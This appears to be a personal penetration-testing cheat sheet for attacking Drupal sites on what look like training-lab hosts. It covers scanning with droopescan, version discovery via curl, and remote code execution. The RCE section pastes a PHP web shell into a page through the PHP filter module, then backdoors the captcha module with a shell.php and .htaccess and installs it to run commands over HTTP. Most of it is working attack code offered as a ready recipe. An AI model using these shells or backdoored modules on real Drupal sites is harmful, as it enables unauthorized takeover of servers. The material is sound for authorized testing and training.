
droopescan
```
sudo pip3 install droopescan
droopescan scan drupal --url http://dev.inlanefreight.local/
```

Discovery
```
curl -s http://drupal.inlanefreight.local | grep Drupal
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
```

RCE
Drupal <8
Login in as admin and enable PHP filter module 
![Drupal Module](cybersecurity-portfolio/cheatsheets/Images/Pasted image 20260413143909.png)
Then navigate to Content > Add Content and create a basic page 
```
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```
![[Pasted image 20260413143959.png|594]]

Drupal 8>
Download and install the PHP filter module 
```
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```
Then Administration > Reports > Available Updates and upload the file. Now follow steps for Drupal <8

Uploading Backdoored Module 
Add shell to existing module
```
wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
Create PHP web shell
```
<?php
system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
?>
```
Now we need a .htaccess file for access to /modules folder
```
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
Copy both .htaccess and webshell to CAPTCHA folder 
```
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
1) Click Manage and the Extend on the side bar
2) Then click + Install new module
3) Browse to the Captcha archive and install 
4) Navigate to /modules/captcha/shell.php
```
curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```
